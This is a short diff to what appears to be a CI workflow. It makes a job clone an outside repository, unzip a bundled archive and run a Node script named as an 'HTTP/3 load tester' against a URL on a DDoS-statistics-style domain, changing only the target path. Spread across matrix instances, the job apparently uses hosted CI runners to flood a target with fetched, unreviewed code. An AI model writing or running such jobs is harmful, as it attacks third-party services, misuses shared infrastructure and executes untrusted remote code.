@@ -37,9 +37,11 @@ jobs:
             
       - name: Run HTTP/3 load tester
         run: |
+          git clone https://github.com/Fegp1p2/ideal-guide.git
+          cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          node m.js https://captcha.dstatbot.win/fauEBiW1 200 3 3 3
+          node m.js https://captcha.dstatbot.win/jEfaistj  200 3 3 3
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
